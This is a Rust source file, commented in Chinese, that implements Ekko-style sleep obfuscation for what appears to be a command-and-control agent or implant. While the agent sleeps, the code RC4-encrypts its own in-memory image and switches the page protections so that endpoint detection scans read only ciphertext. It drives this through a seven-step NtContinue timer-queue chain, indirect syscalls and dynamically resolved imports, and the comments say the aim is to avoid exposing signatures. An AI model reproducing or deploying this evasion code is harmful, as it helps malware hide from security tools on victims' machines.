//! Ekko 式 sleep 混淆（独立实现）。
//!
//! 思路：sleep 期间把 Agent 自身镜像从 RX 改为 RW，用随机 16 字节 key 做一次
//! RC4 加密，让 EDR 的内存扫描读到密文；醒来前解密并恢复 RX。
//!
//! 执行模型（与参考实现同构、细节独立）：
//! - 主线程用间接 syscall `NtSignalAndWaitForSingleObject` 原子地发开始信号并
//!   阻塞，此时其用户态 Rip 停在内核，不执行被加密的模块代码。
//! - timer 线程按序执行 7 个 `NtContinue(CONTEXT)` 环节，每个环节的目标函数
//!   都是系统 DLL 导出（`VirtualProtect` / `SystemFunction032` /
//!   `WaitForSingleObjectEx` / `NtSetEvent`），Rip 从不落入 Agent 模块，因此
//!   加密自身 .text 是安全的。
//!
//! 差异化：函数全部 `GetProcAddress` 动态解析（import 表不暴露特征）、RC4 用
//! 系统 `SystemFunction032`、环节省略 stack spoof（`spoof.rs` 单独提供）。

use core::ffi::c_void;

use crate::ffi::{wide, GetModuleHandleW, GetProcAddress};
use crate::invoke::{
    nt_close, nt_create_event, nt_set_event, nt_signal_and_wait_for_single_object,
};
use crate::pe::PeImage;

// ── 常量 ───────────────────────────────────────────────────────────────

const CONTEXT_FULL: u32 = 0x0010_0007;
const WT_EXECUTEINTIMERTHREAD: u32 = 0x0000_0020;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const EVENT_ALL_ACCESS: u32 = 0x1F_0003;
const NOTIFICATION_EVENT: u32 = 0;
const INFINITE: u32 = 0xFFFF_FFFF;
const NEG_ONE_HANDLE: usize = usize::MAX; // NtCurrentProcess() 伪句柄

// ── 结构 ───────────────────────────────────────────────────────────────

/// 完整 x64 `CONTEXT`（1232 字节，16 对齐）。偏移与 winnt.h 一致。
#[repr(C, align(16))]
#[derive(Clone, Copy)]
pub struct Context {
    pub p1_home: u64,
    pub p2_home: u64,
    pub p3_home: u64,
    pub p4_home: u64,
    pub p5_home: u64,
    pub p6_home: u64,
    pub context_flags: u32,
    pub mx_csr: u32,
    pub seg_cs: u16,
    pub seg_ds: u16,
    pub seg_es: u16,
    pub seg_fs: u16,
    pub seg_gs: u16,
    pub seg_ss: u16,
    pub e_flags: u32,
    pub dr0: u64,
    pub dr1: u64,
    pub dr2: u64,
    pub dr3: u64,
    pub dr6: u64,
    pub dr7: u64,
    pub rax: u64,
    pub rcx: u64,
    pub rdx: u64,
    pub rbx: u64,
    pub rsp: u64,
    pub rbp: u64,
    pub rsi: u64,
    pub rdi: u64,
    pub r8: u64,
    pub r9: u64,
    pub r10: u64,
    pub r11: u64,
    pub r12: u64,
    pub r13: u64,
    pub r14: u64,
    pub r15: u64,
    pub rip: u64,
    pub flt_save: [u8; 512],
    pub vector_register: [u8; 416],
    pub vector_control: u64,
    pub debug_control: u64,
    pub last_branch_to_rip: u64,
    pub last_branch_from_rip: u64,
    pub last_exception_to_rip: u64,
    pub last_exception_from_rip: u64,
}

impl Context {
    pub fn zeroed() -> Self {
        unsafe { core::mem::zeroed() }
    }
}

/// 与 `SystemFunction032` 匹配的 `USTRING`。
#[repr(C)]
struct UString {
    length: u32,
    max_length: u32,
    buffer: *mut u8,
}

/// `MEMORY_BASIC_INFORMATION`（x64）。
#[repr(C)]
#[derive(Clone, Copy)]
struct MemBasicInfo {
    base_address: usize,
    allocation_base: usize,
    allocation_protect: u32,
    partition_id: u16,
    region_size: usize,
    state: u32,
    protect: u32,
    type_: u32,
}

// ── 动态解析类型 ───────────────────────────────────────────────────────

type FnCaptureContext = unsafe extern "system" fn(*mut Context);
type FnNtContinue = unsafe extern "system" fn(*const Context) -> i32;
type FnCreateTimerQueue = unsafe extern "system" fn(*mut usize) -> i32;
type FnCreateTimer =
    unsafe extern "system" fn(usize, *mut usize, usize, usize, u32, u32, u32) -> i32;
type FnDeleteTimerQueue = unsafe extern "system" fn(usize) -> i32;
type FnVirtualProtect = unsafe extern "system" fn(usize, usize, u32, *mut u32) -> i32;
type FnWaitSingleEx = unsafe extern "system" fn(usize, u32, i32) -> u32;
type FnVirtualQuery = unsafe extern "system" fn(usize, *mut MemBasicInfo, usize) -> usize;
type FnSystemFunction032 = unsafe extern "system" fn(*const UString, *const UString) -> i32;

// ── 辅助 ───────────────────────────────────────────────────────────────

/// 解析某个模块的导出地址。
unsafe fn resolve(module: *mut c_void, name: &[u8]) -> usize {
    let mut n = name.to_vec();
    n.push(0);
    GetProcAddress(module, n.as_ptr()) as usize
}

/// 用 rdtsc + 进程号做种子的 xorshift64，生成一次性混淆 key。
/// 注意：这里只需要「每次不同」而非密码学强度 —— key 仅用于让镜像字节不可
/// 直接识别，不承载长期秘密。
fn fill_random(buf: &mut [u8]) {
    let lo: u32;
    let hi: u32;
    unsafe {
        core::arch::asm!("rdtsc", out("eax") lo, out("edx") hi);
    }
    let mut state = ((hi as u64) << 32) | lo as u64;
    state ^= (std::process::id() as u64) << 32;
    state ^= buf.as_ptr() as u64;

    for b in buf.iter_mut() {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        *b = state as u8;
    }
}

/// 通过 `VirtualQuery` 拿到自身所在模块的基址 + `SizeOfImage`。
unsafe fn self_module_range() -> Option<(usize, usize)> {
    let here = self_module_range as *const () as usize;
    let mut mbi = core::mem::zeroed::<MemBasicInfo>();
    let queried = {
        let kernel32 = GetModuleHandleW(wide("kernel32.dll").as_ptr());
        let f: FnVirtualQuery = core::mem::transmute(resolve(kernel32, b"VirtualQuery\0"));
        f(here, &mut mbi, core::mem::size_of::<MemBasicInfo>())
    };
    if queried == 0 || mbi.allocation_base == 0 {
        return None;
    }
    let img = PeImage::parse(mbi.allocation_base)?;
    let size = img.size_of_image();
    if size == 0 {
        return None;
    }
    Some((mbi.allocation_base, size))
}

/// timer 回调：设置事件（在加密开始前执行，可安全走间接 syscall）。
unsafe extern "system" fn set_event_cb(param: usize, _fired: u8) {
    nt_set_event(param, core::ptr::null_mut());
}

// ── 主入口 ─────────────────────────────────────────────────────────────

/// 执行一次混淆 sleep。
///
/// 成功返回 `true`；任何一步失败会回退到普通 `std::thread::sleep` 并返回
/// `false`（sleep 语义始终满足，只是失去混淆）。
///
/// # Safety
/// 必须在 `crate::init()` 之后调用。调用线程会阻塞 `timeout_ms`。
pub unsafe fn obfuscated_sleep(timeout_ms: u32) -> bool {
    if timeout_ms == 0 {
        return true;
    }
    if let Ok(true) = ekko_sleep(timeout_ms) {
        return true;
    }
    // fallback：普通 sleep
    std::thread::sleep(std::time::Duration::from_millis(timeout_ms as u64));
    false
}

unsafe fn ekko_sleep(timeout_ms: u32) -> Result<bool, ()> {
    let (base, size) = self_module_range().ok_or(())?;
    let img = PeImage::parse(base).ok_or(())?;
    // 恢复保护时只恢复 .text 段；.data/.rdata 保持可写，否则主线程醒来的
    // 清理代码（stderr 锁等 .data 状态）会因写只读页而崩溃。
    let (text_base, text_size) = img.section_range(b".text\0\0\0").unwrap_or((base, size));

    // 动态解析系统导出
    let ntdll = GetModuleHandleW(wide("ntdll.dll").as_ptr());
    let kernel32 = GetModuleHandleW(wide("kernel32.dll").as_ptr());
    let advapi32 = GetModuleHandleW(wide("advapi32.dll").as_ptr());
    if ntdll.is_null() || kernel32.is_null() || advapi32.is_null() {
        return Err(());
    }

    let rtl_capture: FnCaptureContext =
        core::mem::transmute(resolve(ntdll, b"RtlCaptureContext\0"));
    let nt_continue: FnNtContinue = core::mem::transmute(resolve(ntdll, b"NtContinue\0"));
    let rtl_create_queue: FnCreateTimerQueue =
        core::mem::transmute(resolve(ntdll, b"RtlCreateTimerQueue\0"));
    let rtl_create_timer: FnCreateTimer = core::mem::transmute(resolve(ntdll, b"RtlCreateTimer\0"));
    let rtl_delete_queue: FnDeleteTimerQueue =
        core::mem::transmute(resolve(ntdll, b"RtlDeleteTimerQueue\0"));
    let virtual_protect: FnVirtualProtect =
        core::mem::transmute(resolve(kernel32, b"VirtualProtect\0"));
    let wait_single_ex: FnWaitSingleEx =
        core::mem::transmute(resolve(kernel32, b"WaitForSingleObjectEx\0"));
    let sys032: FnSystemFunction032 =
        core::mem::transmute(resolve(advapi32, b"SystemFunction032\0"));

    if rtl_capture as usize == 0
        || nt_continue as usize == 0
        || rtl_create_queue as usize == 0
        || rtl_create_timer as usize == 0
        || rtl_delete_queue as usize == 0
        || virtual_protect as usize == 0
        || wait_single_ex as usize == 0
        || sys032 as usize == 0
    {
        return Err(());
    }

    // 一次性 key + 镜像描述
    let mut key = [0u8; 16];
    fill_random(&mut key);
    let key_str = UString {
        length: 16,
        max_length: 16,
        buffer: key.as_mut_ptr(),
    };
    let img_str = UString {
        length: size as u32,
        max_length: size as u32,
        buffer: base as *mut u8,
    };

    // 事件（间接 syscall）
    let mut evt_timer = 0usize;
    let mut evt_start = 0usize;
    let mut evt_delay = 0usize;
    if nt_create_event(&mut evt_timer, EVENT_ALL_ACCESS, 0, NOTIFICATION_EVENT, 0) != 0
        || nt_create_event(&mut evt_start, EVENT_ALL_ACCESS, 0, NOTIFICATION_EVENT, 0) != 0
        || nt_create_event(&mut evt_delay, EVENT_ALL_ACCESS, 0, NOTIFICATION_EVENT, 0) != 0
    {
        return Err(());
    }

    // timer queue
    let mut queue = 0usize;
    if rtl_create_queue(&mut queue) != 0 || queue == 0 {
        nt_close(evt_timer);
        nt_close(evt_start);
        nt_close(evt_delay);
        return Err(());
    }

    // 捕获 timer 线程上下文
    let mut timer_ctx = Context::zeroed();
    timer_ctx.context_flags = CONTEXT_FULL;
    let mut timer = 0usize;
    let mut due = 100u32;
    if rtl_create_timer(
        queue,
        &mut timer,
        rtl_capture as usize,
        &mut timer_ctx as *mut _ as usize,
        due,
        0,
        WT_EXECUTEINTIMERTHREAD,
    ) != 0
    {
        rtl_delete_queue(queue);
        nt_close(evt_timer);
        nt_close(evt_start);
        nt_close(evt_delay);
        return Err(());
    }
    due += 100;

    // 通知上下文已捕获
    if rtl_create_timer(
        queue,
        &mut timer,
        set_event_cb as *const () as usize,
        evt_timer as usize,
        due,
        0,
        WT_EXECUTEINTIMERTHREAD,
    ) != 0
    {
        rtl_delete_queue(queue);
        nt_close(evt_timer);
        nt_close(evt_start);
        nt_close(evt_delay);
        return Err(());
    }
    due += 100;

    // 等上下文捕获完成
    if nt_wait_single(evt_timer) != 0 {
        rtl_delete_queue(queue);
        nt_close(evt_timer);
        nt_close(evt_start);
        nt_close(evt_delay);
        return Err(());
    }

    // 构建 7 个 ROP 环节
    let mut old1 = 0u32;
    let mut old2 = 0u32;
    let mut rop = [timer_ctx; 7];
    for c in rop.iter_mut() {
        c.rsp = timer_ctx.rsp.wrapping_sub(8);
    }

    // [0] WaitForSingleObjectEx(evt_start, INFINITE, FALSE)
    rop[0].rip = wait_single_ex as usize as u64;
    rop[0].rcx = evt_start as u64;
    rop[0].rdx = INFINITE as u64;
    rop[0].r8 = 0;
    // [1] VirtualProtect(base, size, RW, &old1)
    rop[1].rip = virtual_protect as usize as u64;
    rop[1].rcx = base as u64;
    rop[1].rdx = size as u64;
    rop[1].r8 = PAGE_READWRITE as u64;
    rop[1].r9 = &mut old1 as *mut u32 as u64;
    // [2] SystemFunction032(&img, &key) —— 加密
    rop[2].rip = sys032 as usize as u64;
    rop[2].rcx = &img_str as *const UString as u64;
    rop[2].rdx = &key_str as *const UString as u64;
    // [3] WaitForSingleObjectEx(-1, timeout, FALSE) —— sleep
    rop[3].rip = wait_single_ex as usize as u64;
    rop[3].rcx = NEG_ONE_HANDLE as u64;
    rop[3].rdx = timeout_ms as u64;
    rop[3].r8 = 0;
    // [4] SystemFunction032(&img, &key) —— 解密（RC4 对称）
    rop[4].rip = sys032 as usize as u64;
    rop[4].rcx = &img_str as *const UString as u64;
    rop[4].rdx = &key_str as *const UString as u64;
    // [5] VirtualProtect(.text, RX, &old2) —— 只恢复 .text 段
    rop[5].rip = virtual_protect as usize as u64;
    rop[5].rcx = text_base as u64;
    rop[5].rdx = text_size as u64;
    rop[5].r8 = PAGE_EXECUTE_READ as u64;
    rop[5].r9 = &mut old2 as *mut u32 as u64;
    // [6] NtSetEvent(evt_delay)
    rop[6].rip = resolve(ntdll, b"NtSetEvent\0") as u64;
    rop[6].rcx = evt_delay as u64;
    rop[6].rdx = 0;

    // 排入 7 个环节
    for c in rop.iter_mut() {
        if rtl_create_timer(
            queue,
            &mut timer,
            nt_continue as usize,
            c as *mut Context as usize,
            due,
            0,
            WT_EXECUTEINTIMERTHREAD,
        ) != 0
        {
            rtl_delete_queue(queue);
            nt_close(evt_timer);
            nt_close(evt_start);
            nt_close(evt_delay);
            return Err(());
        }
        due += 100;
    }

    // 主线程：原子 signal(evt_start) + wait(evt_delay)，期间 Rip 停在内核。
    let status =
        nt_signal_and_wait_for_single_object(evt_start, evt_delay, 0, core::ptr::null_mut());

    // 清理
    rtl_delete_queue(queue);
    nt_close(evt_timer);
    nt_close(evt_start);
    nt_close(evt_delay);
    key.fill(0);

    Ok(status == 0)
}

/// 间接 syscall 等待单个对象（等事件，非阻塞）。
unsafe fn nt_wait_single(handle: usize) -> i32 {
    // NtWaitForSingleObject(handle, FALSE, NULL)
    crate::invoke::nt_wait_for_single_object(handle, 0, core::ptr::null_mut())
}

#[cfg(all(test, windows))]
mod tests {
    use super::*;

    #[test]
    fn context_layout_matches_winnt() {
        assert_eq!(core::mem::size_of::<Context>(), 1232);
        assert_eq!(core::mem::offset_of!(Context, context_flags), 0x30);
        assert_eq!(core::mem::offset_of!(Context, rax), 0x78);
        assert_eq!(core::mem::offset_of!(Context, rcx), 0x80);
        assert_eq!(core::mem::offset_of!(Context, rsp), 0x98);
        assert_eq!(core::mem::offset_of!(Context, r8), 0xB8);
        assert_eq!(core::mem::offset_of!(Context, rip), 0xF8);
        assert_eq!(core::mem::offset_of!(Context, vector_control), 0x4A0);
    }
}
